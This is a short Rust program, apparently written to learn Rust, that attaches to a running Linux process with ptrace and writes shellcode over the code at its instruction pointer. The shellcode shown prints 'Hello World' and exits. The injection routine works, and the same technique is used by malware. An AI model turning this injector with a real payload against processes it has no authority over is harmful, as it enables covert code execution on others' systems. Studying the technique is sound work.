/// see this paper:
/// https://papers.vx-underground.org/papers/VXUG/Mirrors/Injection/linux/0x00sec.org-Linux%20Infecting%20Running%20Processes.pdf
/// all credit goes to the author.
/// I just re-wrote this to learn rust and try out code injection on linux
/// 0xca7

use nix::sys::ptrace;
use nix::sys::wait::wait;
use nix::unistd::Pid;

use std::env;
use std::ffi::c_void;

/// write raw data to a process
fn proc_write(pid: &Pid, target_addr: u64) {

    // we inject shellcode here. 
    let shellcode: [u8;56] = [
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64,
        0x0a, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
      ];

    print!(">> injecting code\n");

    let mut target_addr = target_addr;

    unsafe {

        for idx in 0..(shellcode.len()-8) / 8 {
            let sc = i64::from_le_bytes(
                shellcode[idx*8..((idx+1)*8)]
                    .try_into()
                    .expect("array from slice failed")
                );

            ptrace::write(*pid, target_addr as *mut c_void,
                sc as *mut c_void).unwrap();

            target_addr += 8;
            print!("injecting {:x?} to {:x?}\n", sc, target_addr);

        } // for

    } // unsafe

}

/// set up and run process injection
fn inject(pid: &Pid) {

    // attach
    match ptrace::attach(*pid) {
        Ok(()) => print!("++ attached to process"),
        Err(e) => {
            print!("!! unable to attach: {}", e);
            std::process::exit(1);
        }
    } // match

    // wait for process to send SIGTRAP
    let status = wait().unwrap();

    print!("++ process stopped with: {:?}\n", status);

    // we should be safe to unwrap here, if we can attach and the
    // process is stopped, this shouldn't be a problem
    let mut regs = ptrace::getregs(*pid).unwrap();
    print!("rip @ 0x{:x}\n", regs.rip);

    // let's inject some data
    proc_write(pid, regs.rip);

    // "magic" increment of rip
    regs.rip += 2;

    // set registers, run target
    ptrace::setregs(*pid, regs).unwrap();

    print!("++ continue target");
    match ptrace::detach(*pid, None) {
        Ok(()) => print!("++ detached\n"),
        Err(e) => {
            print!("!! unable to detach: {}", e);
            std::process::exit(1);
        }
    } // match

}


fn main() {

    let args : Vec<String> = env::args().collect();

    if args.len() != 2 {
        print!("usage: [process injector] [PID]");
        std::process::exit(1);
    }    

    // parse the PID to an i32
    let pid = args[1].parse::<i32>();

    // check the PID
    let pid = match pid {
        Ok(p) => p,
        Err(e) => {
            print!("error converting PID: {}", e);
            std::process::exit(1);
        }
    };

    let pid = Pid::from_raw(pid);

    print!("++ Process Injector ++\n");

    // we have our PID, let's inject
    inject(&pid);
}